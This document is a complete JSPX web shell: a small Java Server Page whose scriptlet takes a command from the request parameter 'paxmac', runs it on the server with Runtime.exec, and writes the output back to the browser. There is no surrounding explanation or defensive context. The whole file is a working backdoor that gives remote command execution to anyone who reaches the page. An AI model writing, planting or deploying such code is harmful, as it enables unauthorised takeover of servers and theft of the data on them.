<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"
          xmlns="http://www.w3.org/1999/xhtml"
          xmlns:c="http://java.sun.com/jsp/jstl/core" version="1.2">
    <jsp:directive.page contentType="text/html" pageEncoding="gb2312"/>
    <jsp:directive.page import="java.io.*"/>

    <html>
        <head>
            <title>jspx</title>
        </head>
        <body>
            <jsp:scriptlet>
               try {
		String cmd = request.getParameter("paxmac");
		if (cmd !=null){
			Process child = Runtime.getRuntime().exec(cmd);
			InputStream in = child.getInputStream();
			int c;
			while ((c = in.read()) != -1) {
			out.print((char)c);
			}
			in.close();
			try {
			child.waitFor();
			} catch (InterruptedException e) {
			e.printStackTrace();
		}
		}
		} catch (IOException e) {
		System.err.println(e);
		}
            </jsp:scriptlet>
        </body>
    </html>
</jsp:root>
